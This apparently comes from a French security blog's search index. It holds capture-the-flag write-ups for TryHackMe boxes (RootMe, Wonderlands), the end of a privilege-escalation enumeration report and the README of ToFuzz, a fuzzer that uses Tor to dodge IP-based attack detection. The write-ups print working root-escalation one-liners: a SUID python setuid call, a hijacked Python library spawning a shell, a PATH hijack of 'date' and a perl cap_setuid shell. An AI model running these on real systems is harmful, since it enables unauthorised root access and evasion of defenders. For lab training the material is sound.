3.13.0-55-generic Distribution: Ubuntu 14.04.2 LTS Architecture: x86_64 =====================( Current Output Verbosity Level: 0 )====================== ===============================================================( humanity )===== [!] nowar0 Should we question autocrats and their \u0026#34;military operations\u0026#34;?... yes! --- NO WAR --- ==================================================================( users )===== [i] usr000 Current user groups............................................. yes! [*] usr010 Is current user in an administrative group?..................... nope [*] usr020 Are there other users in administrative groups?................. yes! [*] usr030 Other users with shell.......................................... yes! [i] usr040 Environment information......................................... skip [i] usr050 Groups for other users.......................................... skip [i] usr060 Other users..................................................... skip [*] usr070 PATH variables defined inside /etc.............................. yes! [!] usr080 Is \u0026#39;.\u0026#39; in a PATH variable defined inside /etc?.................. nope ===================================================================( sudo )===== [!] sud000 Can we sudo without a password?................................. nope [!] sud010 Can we list sudo commands without a password?................... nope [!] sud020 Can we sudo with a password?.................................... nope [!] sud030 Can we list sudo commands with a password?...................... nope [*] sud040 Can we read sudoers files?...................................... nope [*] sud050 Do we know if any other users used sudo?........................ nope ============================================================( file system )===== [*] fst000 Writable files outside user\u0026#39;s home.............................. yes! [*] fst010 Binaries with setuid bit........................................ yes! [!] fst020 Uncommon setuid binaries........................................ yes! --- /usr/local/bin/nmap /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper --- [!] fst030 Can we write to any setuid binary?.............................. nope [*] fst040 Binaries with setgid bit........................................ skip [!] fst050 Uncommon setgid binaries........................................ skip [!] fst060 Can we write to any setgid binary?.............................. skip [*] fst070 Can we read /root?.............................................. nope [*] fst080 Can we read subdirectories under /home?......................... nope [*] fst090 SSH files in home directories................................... nope [*] fst100 Useful binaries................................................. yes! [*] fst110 Other interesting files in home directories..................... nope [!] fst120 Are there any credentials in fstab/mtab?........................ nope [*] fst130 Does \u0026#39;robot\u0026#39; have mail?......................................... nope [!] fst140 Can we access other users mail?................................. nope [*] fst150 Looking for GIT/SVN repositories................................ yes! [!] fst160 Can we write to critical files?................................. nope [!] fst170 Can we write to critical directories?........................... nope [!] fst180 Can we write to directories from PATH defined in /etc?.......... nope [!] fst190 Can we read any backup?......................................... nope [!] fst200 Are there possible credentials in any shell history file?....... nope [!] fst210 Are there NFS exports with \u0026#39;no_root_squash\u0026#39; option?............. nope [*] fst220 Are there NFS exports with \u0026#39;no_all_squash\u0026#39; option?.............. nope [i] fst500 Files owned by user \u0026#39;robot\u0026#39;..................................... skip [i] fst510 SSH files anywhere.............................................. skip [i] fst520 Check hosts.equiv file and its contents......................... skip [i] fst530 List NFS server shares.......................................... skip [i] fst540 Dump fstab file................................................. skip =================================================================( system )===== [i] sys000 Who is logged in................................................ skip [i] sys010 Last logged in users............................................ skip [!] sys020 Does the /etc/passwd have hashes?............................... nope [!] sys022 Does the /etc/group have hashes?................................ nope [!] sys030 Can we read shadow files?....................................... nope [*] sys040 Check for other superuser accounts.............................. nope [*] sys050 Can root user log in via SSH?................................... yes! [i] sys060 List available shells........................................... skip [i] sys070 System umask in /etc/login.defs................................. skip [i] sys080 System password policies in /etc/login.defs..................... skip ===============================================================( security )===== [*] sec000 Is SELinux present?............................................. nope [*] sec010 List files with capabilities.................................... nope [!] sec020 Can we write to a binary with caps?............................. nope [!] sec030 Do we have all caps in any binary?.............................. nope [*] sec040 Users with associated capabilities.............................. nope [!] sec050 Does current user have capabilities?............................ skip [!] sec060 Can we read the auditd log?..................................... nope ========================================================( recurrent tasks )===== [*] ret000 User crontab.................................................... nope [!] ret010 Cron tasks writable by user..................................... nope [*] ret020 Cron jobs....................................................... yes! [*] ret030 Can we read user crontabs....................................... nope [*] ret040 Can we list other user cron tasks?.............................. nope [*] ret050 Can we write to any paths present in cron jobs.................. nope [!] ret060 Can we write to executable paths present in cron jobs........... skip [i] ret400 Cron files...................................................... skip [*] ret500 User systemd timers............................................. nope [!] ret510 Can we write in any system timer?............................... nope [i] ret900 Systemd timers.................................................. skip ================================================================( network )===== [*] net000 Services listening only on localhost............................ yes! [!] net010 Can we sniff traffic with tcpdump?.............................. nope [i] net500 NIC and IP information.......................................... skip [i] net510 Routing table................................................... skip [i] net520 ARP table....................................................... skip [i] net530 Nameservers..................................................... skip [i] net540 Systemd Nameservers............................................. skip [i] net550 Listening TCP................................................... skip [i] net560 Listening UDP................................................... skip ===============================================================( services )===== [!] srv000 Can we write in service files?.................................. nope [!] srv010 Can we write in binaries executed by services?.................. nope [*] srv020 Files in /etc/init.d/ not belonging to root..................... nope [*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope [*] srv040 Upstart files not belonging to root............................. nope [*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope [i] srv400 Contents of /etc/inetd.conf..................................... skip [i] srv410 Contents of /etc/xinetd.conf.................................... skip [i] srv420 List /etc/xinetd.d if used...................................... skip [i] srv430 List /etc/init.d/ permissions................................... skip [i] srv440 List /etc/rc.d/init.d permissions............................... skip [i] srv450 List /usr/local/etc/rc.d permissions............................ skip [i] srv460 List /etc/init/ permissions..................................... skip [!] srv500 Can we write in systemd service files?.......................... nope [!] srv510 Can we write in binaries executed by systemd services?.......... nope [*] srv520 Systemd files not belonging to root............................. nope [i] srv900 Systemd config files permissions................................ skip ===============================================================( software )===== [!] sof000 Can we connect to MySQL with root/root credentials?............. nope [!] sof010 Can we connect to MySQL as root without password?............... nope [!] sof015 Are there credentials in mysql_history file?.................... nope [!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope [!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope [!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope [!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope [*] sof030 Installed apache modules........................................ nope [!] sof040 Found any .htpasswd files?...................................... nope [!] sof050 Are there private keys in ssh-agent?............................ nope [!] sof060 Are there gpg keys cached in gpg-agent?......................... nope [!] sof070 Can we write to a ssh-agent socket?............................. nope [!] sof080 Can we write to a gpg-agent socket?............................. nope [!] sof090 Found any keepass database files?............................... nope [!] sof100 Found any \u0026#39;pass\u0026#39; store directories?............................. nope [!] sof110 Are there any tmux sessions available?.......................... nope [*] sof120 Are there any tmux sessions from other users?................... nope [!] sof130 Can we write to tmux session sockets from other users?.......... nope [!] sof140 Are any screen sessions available?.............................. nope [*] sof150 Are there any screen sessions from other users?................. nope [!] sof160 Can we write to screen session sockets from other users?........ nope [*] sof170 Can we access MongoDB databases without credentials?............ nope [!] sof180 Can we access any Kerberos credentials?......................... nope [i] sof500 Sudo version.................................................... skip [i] sof510 MySQL version................................................... skip [i] sof520 Postgres version................................................ skip [i] sof530 Apache version.................................................. skip [i] sof540 Tmux version.................................................... skip [i] sof550 Screen version.................................................. skip =============================================================( containers )===== [*] ctn000 Are we in a docker container?................................... nope [*] ctn010 Is docker available?............................................ nope [!] ctn020 Is the user a member of the \u0026#39;docker\u0026#39; group?..................... nope [*] ctn200 Are we in a lxc container?...................................... nope [!] ctn210 Is the user a member of any lxc/lxd group?...................... nope ==============================================================( processes )===== [i] pro000 Waiting for the process monitor to finish....................... yes! [i] pro001 Retrieving process binaries..................................... yes! [i] pro002 Retrieving process users........................................ yes! [!] pro010 Can we write in any process binary?............................. nope [*] pro020 Processes running with root permissions......................... yes! [*] pro030 Processes running by non-root users with shell.................. nope [i] pro500 Running processes............................................... skip [i] pro510 Running process binaries and permissions........................ skip ===================================================================( CVEs )===== [!] cve-2019-5736 Escalate in some types of docker containers.............. nope [!] cve-2021-3156 Sudo Baron Samedit vulnerability......................... yes! --- Vulnerable! sudo version: 1.8.9p5-1ubuntu1.1 --- [!] cve-2021-3560 Checking for policykit vulnerability..................... nope [!] cve-2021-4034 Checking for PwnKit vulnerability........................ nope [!] cve-2022-0847 Dirty Pipe vulnerability................................. nope [!] cve-2022-25636 Netfilter linux kernel vulnerability.................... nope [!] cve-2023-22809 Sudoedit bypass in Sudo \u0026lt;= 1.9.12p1..................... yes! --- Vulnerable! sudo version: 1.8.9p5-1ubuntu1.1 --- ==================================( FINISHED )================================== Dirtycow # L\u0026rsquo;énumération nous montre une faille possible avec dirtycow. On exploite directement la faille et on obtient un shell root pour notre dernier drapeau.\n"},{"id":8,"href":"/docs/writeups/vm/collapsed/rootme/","title":"RootMe","section":"Virtual Machines","content":"\nLa box RootMe est une box facile de la plateforme TryHackMe. Il y a deux drapeau à récupérer et pour commencer, il nous est fournit une adresse IP.\nReconnaissance # Commençons par une simple reconnaissance, en plus d’accéder directement via le navigateur, on va voir quels ports sont ouverts sur la machine :\nnmap -sT 10.10.49.213 Starting Nmap 7.91 ( https://nmap.org ) at 2025-09-30 21:44 CEST Nmap scan report for 10.10.49.213 Host is up (0.14s latency). Not shown: 998 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 37.01 seconds On voit qu’il y a 2 ports ouverts : le port SSH et le port HTTP qui correspond à l’application web. En accédant à l’application on arrive sur la page dont la capture d’écran sert de bannière, on va donc énumérer les dossiers avec gobuster :\ngobuster dir -u http://10.10.49.213 -w ../../SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt =============================================================== Gobuster v3.8.2 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.49.213 [+] Method: GET [+] Threads: 10 [+] Wordlist: ../../SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.8.2 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== uploads (Status: 301) [Size: 314] [--\u0026gt; http://10.10.49.213/uploads/] css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.49.213/css/] js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.49.213/js/] panel (Status: 301) [Size: 312] [--\u0026gt; http://10.10.49.213/panel/] On trouve une page uploads qui nous permet de téléverser des fichiers.\nAccès initial # En essayant de charger des fichiers on s’aperçoit que que l’extension PHP est filtrée par une regex via l’extension du fichier. On essai les classiques %00, .pHp, et surcharge du .htaccess, mais finalement c’est en ajoutant juste un point à la fin que l’on réussi à téléverser notre fichier php .\nOn peut maintenant exécuter des commandes bash sur la machine.\nEscalade de privilège # Nous ne pouvons pas énumérer les droits sudo car nous n’avons pas le mot de passe de l’utilisateur www-data et que le système ne nous le permet pas. Cependant on trouve quelques fichiers ayant les droits SUID :\nOn voit que python a un SUID root, c’est un bon candidat pour une escalade de privilège. Nous allons directement essayer d’énumérer le contenu du dossier /root :\n/usr/bin/python2.7 -c \u0026#39;import os;os.setuid(0); os.system(\u0026#34;ls -la /root 2\u0026gt;\u0026amp;1\u0026#34;)\u0026#39; 2\u0026gt;\u0026amp;1 L’énumération fonctionne ce qui veut dire que nous avons bien les droits root. On peut directement lire le flag /root/root.txt\n/usr/bin/python2.7 -c \u0026#39;import os;os.setuid(0); os.system(\u0026#34;cat /root/root.txt 2\u0026gt;\u0026amp;1\u0026#34;)\u0026#39; 2\u0026gt;\u0026amp;1 "},{"id":9,"href":"/docs/projets/collapsed/tofuzz/","title":"ToFuzz","section":"Projets Personnels","content":"\nToFuzz is an opensource Fuzzing tool able to use the tor network to limit the footprint on the targetted server and escape the attack detection by IP Filter.\nInstallation # pip install . Help # $ tofuzz -h ___________ _____ \\__ ___/____/ ____\\_ __________________ | | / _ \\ __\\ | \\___ /\\___ / | |( \u0026lt;_\u0026gt; ) | | | // / / / |____| \\____/|__| |____//_____ \\/_____ \\ \\/ \\/ usage: ToFuzz [-h] [-X METHOD] -u URL [-H HEADERS] [-b BODY] -w WORDLIST [--fuzztoken FUZZTOKEN] [-t THREADS] [-v] [-T] [--tor-host TOR_HOST] [--tor-port TOR_PORT] ToFuzz – is a multi-threaded fuzzing tool which allow users to use tor network. options: -h, --help show this help message and exit -X, --method METHOD HTTP method to use (default: GET) -u, --url URL Target URL with FUZZ token -H, --headers HEADERS HTTP headers as JSON string -b, --body BODY HTTP body as raw string or JSON string -w, --wordlist Path to the wordlist to use (Will be automatically splitted by thread) Path to wordlist file --fuzztoken FUZZTOKEN Token to replace in URL/body (default: FUZZ) -t, --threads THREADS Number of threads -v, --verbose Verbose Mode -T, --tor Use Tor network --tor-host TOR_HOST Tor SOCKS5 proxy host (default: 127.0.0.1) --tor-port TOR_PORT Tor SOCKS5 proxy port (default: 9050) Simple usage with GET request :\ntofuzz -X GET -u http://www.myapp.com?q=FUZZ -w .\\tofuzz\\resources\\test_wordlist.txt --threads 5 ___________ _____ \\__ ___/____/ ____\\_ __________________ | | / _ \\ __\\ | \\___ /\\___ / | |( \u0026lt;_\u0026gt; ) | | | // / / / |____| \\____/|__| |____//_____ \\/_____ \\ \\/ \\/ METHOD : GET URL : http://www.myapp.com?q=FUZZ WORDLIST : .\\tofuzz\\resources\\test_wordlist.txt (15) FUZZ URL : True FUZZ BODY : False -------------------------------------------------- PAYLOAD=BBBBBBBBBB | HTTP 200 | len = 17676 PAYLOAD=CCCCCCCCCCCCCCCCCCCC | HTTP 200 | len = 17263 PAYLOAD=AAAAA | HTTP 200 | len = 17671 PAYLOAD=EEEEEEEEEE | HTTP 200 | len = 17216 PAYLOAD=DDDDD | HTTP 200 | len = 17678 PAYLOAD=CCCCCCCCCC | HTTP 200 | len = 17612 PAYLOAD=DDDDDDDDDDDDDDDDDDDD | HTTP 200 | len = 17221 PAYLOAD=EEEEE | HTTP 200 | len = 17604 PAYLOAD=AAAAAAAAAAAAAAAAAAAA | HTTP 200 | len = 17670 PAYLOAD=BBBBB | HTTP 200 | len = 17681 PAYLOAD=DDDDDDDDDD | HTTP 200 | len = 17711 PAYLOAD=EEEEEEEEEEEEEEEEEEEE | HTTP 200 | len = 17295 PAYLOAD=AAAAAAAAAA | HTTP 200 | len = 17222 PAYLOAD=CCCCC | HTTP 200 | len = 17177 PAYLOAD=BBBBBBBBBBBBBBBBBBBB | HTTP 200 | len = 17686 Terminated with success Execution time : 0.17 seconds Tor Usage # To use this fuzzer with tor :\nStart Tor Browser with the proxy Add the arguments to commandline --tor start the fuzzing "},{"id":10,"href":"/docs/writeups/vm/","title":"Virtual Machines","section":"Writeups","content":" Virtual Machines # Cette section comprend tous les writeups que j'ai pu écrire pour des challenges provenant de différentes plateformes : Vulnhub Root-Me TryHackMe Quelques Writeups # Mr. Robot : Boot to Root sur un wordpress vulnérable Alice au pays des merveilles : Énumération et multiples escalades de privilèges "},{"id":11,"href":"/docs/writeups/vm/collapsed/wonderlands/","title":"Wonderlands","section":"Virtual Machines","content":" Wonderlands # Cette box suit le thème d'Alice au pays des merveilles. Comme d'habitude sur TryHackMe, il nous est fournit une adresse IP que nous allons commencer par scanner. Première approche avec Nmap # Le scan nous montre que seuls 2 ports sont ouverts, donc nous aurons à priori un premier accès via un site web puis certainement un accès via SSH.\nStarting Nmap 7.91 ( https://nmap.org ) at 2025-09-24 20:05 CEST Nmap scan report for 10.10.186.97 Host is up (0.066s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA) | 256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA) |_ 256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Follow the white rabbit. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.20 seconds Énumération des chemins # Le site web est une page simple qui ne nous fournit pas de lien ni de formulaire. Nous allons donc lancer une énumération pour chercher d\u0026rsquo;autres entrées.\n./gobuster dir -u http://10.10.186.97/ -w ../Wordlists/DirBuster-2007_directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.186.97/ [+] Method: GET [+] Threads: 10 [+] Wordlist: ../Wordlists/DirBuster-2007_directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2025/09/24 20:20:32 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 0] [--\u0026gt; img/] /r (Status: 301) [Size: 0] [--\u0026gt; r/] /poem (Status: 301) [Size: 0] [--\u0026gt; poem/] Nous avons pour commencer plusieurs dossiers :\n/img contient les images /poem ne répond pas /r contient une autre page web, sans lien, mais avec un extrait d\u0026rsquo;Alice au pays des merveilles. Nous allons lancer un autre scan en partant de ce dossier. ./gobuster dir -u http://10.10.186.97/r/ -w ../Wordlists/DirBuster-2007_directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.186.97/r/ [+] Method: GET [+] Threads: 10 [+] Wordlist: ../Wordlists/DirBuster-2007_directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2025/09/24 20:30:01 Starting gobuster in directory enumeration mode =============================================================== /a (Status: 301) [Size: 0] [--\u0026gt; a/] On trouve un autre dossier \u0026lsquo;\u0026rsquo;\u0026rsquo;/a\u0026rsquo;\u0026rsquo;\u0026rsquo;, le début de rabbit. Nous essayons donc le chemin /r/a/b/b/i/t et on tombe sur une page web qui nous fournit un identifiant et un mot de passe à utiliser en SSH.\nalice:HowDothTheLittleCrocodileImproveHisShiningTail\nPremier accès SSH # Premier drapeau # On observe un fichier root.txt dans le dossier de alice. Ce fichier ne devrait pas être là. Après avoir honteusement demandé un indice à TryHackMe (il faut être honnête), TryHackMe nous dit \u0026ldquo;Everything is upside down\u0026rdquo;.\nC\u0026rsquo;est logique : si root.txt est dans alice, alors user.txt est dans root.. et on trouve le drapeau /root/user.txt.\nEnumeration des droits # Revenons à notre box : l\u0026rsquo;énumération des droits sudo nous montre qu\u0026rsquo;il est possible de lancer un script python avec l\u0026rsquo;utilisateur rabbit :\nalice@wonderland:~$ sudo -l [sudo] password for alice: Matching Defaults entries for alice on wonderland: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User alice may run the following commands on wonderland: (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py Library Hijacking # En observant le script, on s\u0026rsquo;aperçoit que celui-ci importe random.py, on va donc créer dans le dossier courant une fausse librairie random.py pour exécuter du code arbitrairement.\nOn implante donc random.py dans le dossier d’alice :\n# random.py import os; os.system(\u0026#34;/bin/sh\u0026#34;) Et on exécute le script avec l\u0026rsquo;utilisateur rabbit :\nsudo -u rabbit python3.6 /home/alice/walrus_and_the_carpenter.py En executant on a un shell avec rabbit.\nCorruption du Path # L\u0026rsquo;utilisateur rabbit ne nous permet pas de lire le fichier root, mais en regardant dans le dossier de rabbit on trouve un executable.\nrabbit@wonderland:/home/rabbit$ ./teaParty Welcome to the tea party! The Mad Hatter will be here soon. Probably by Wed, 25 Sep 2025 21:07:36 +0000 Ask very nicely, and I will give you some tea while you wait for him please Segmentation fault (core dumped) on observe deux choses :\nteaParty a un UID, ce qui veut dire qu\u0026rsquo;il s\u0026rsquo;exécute certainement avec un autre utilisateur. la chaîne \u0026ldquo;Wed, 25 Sep 2025 21:07:36 +0000\u0026rdquo; ressemble beaucoup à la sortie de la commande date. On va donc essayer de corrompre le path pour modifier l\u0026rsquo;exécution de date par /usr/bin/id.\n$ head -1 /tmp/date \u0026gt; /tmp/date $ echo \u0026#34;/usr/bin/id\u0026#34; \u0026gt;\u0026gt; /tmp/date $ PATH=/tmp $ ./teaParty Welcome to the tea party! The Mad Hatter will be here soon. Probably by uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit) Ask very nicely, and I will give you some tea while you wait for him On a bien une modification de date par id : on change /usr/bin/id dans /tmp/date par /bin/bash et on obtient un shell avec hatter.\ngetcap hatter # hatter a un fichier password.txt contenant son mot de passe, on utilise ce mot de passe pour créer une session propre.hatter n\u0026rsquo;a pas de droit sudo, et on ne trouve pas de binaire avec des suid intéressant. On liste les capabilities :\nhatter@wonderland:~$ getcap -r / 2\u0026gt;/dev/null /usr/bin/perl5.26.1 = cap_setuid+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/perl = cap_setuid+ep On observe également que perl appartient au groupe hatter :\nalice@wonderland:~$ ls -l /usr/bin | grep hatter -rwxr-xr-- 2 root hatter 2097720 Nov 19 2018 perl -rwxr-xr-- 2 root hatter 2097720 Nov 19 2018 perl5.26.1 On peut alors faire une escalade de privilège et trouver le dernier drapeau :\nhatter@wonderland:~$ /usr/bin/perl -e \u0026#39;use POSIX qw(setuid); POSIX::setuid(0); exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; # id uid=0(root) gid=1003(hatter) groups=1003(hatter) # cat /home/alice/root.txt thm{XXXXXXX, XXXXXXX, XXXXXX XXX! XXX X XXXXX XXXX XXXXXX XX} "},{"id":12,"href":"/docs/writeups/","title":"Writeups","section":"Docs","content":" Writeups # Dans cette section, vous trouverez quelques write-ups à propos des CTF auxquels j\u0026rsquo;ai pu participer.\nLes Writeups sont des comptes-rendu, plus ou moins détaillé, des CTFs et divers challenge de sécurité. Ceux-ci permettent de détailler un cheminement, plus ou moins intellectuel, et plus ou moins subtile !\nCTF # Root-Me X DGSE Boxs # Mr Robot Alice au pays des merveilles "},{"id":13,"href":"/docs/divers/blogs/","title":"Blogs","section":"Divers","content":" Articles de blogs # J\u0026rsquo;ai eu la chance de pouvoir écrire plusieurs articles de blogs sur des sujets divers et variés. En voici la liste :\nModernisation des applications : Evolution \u0026amp; Enjeux Test de charge : Quel outil open source pour générer une forte charge ? Synthetic Monitoring avec Sitespeed.io et Grafana Tester les performances d’un client web "}]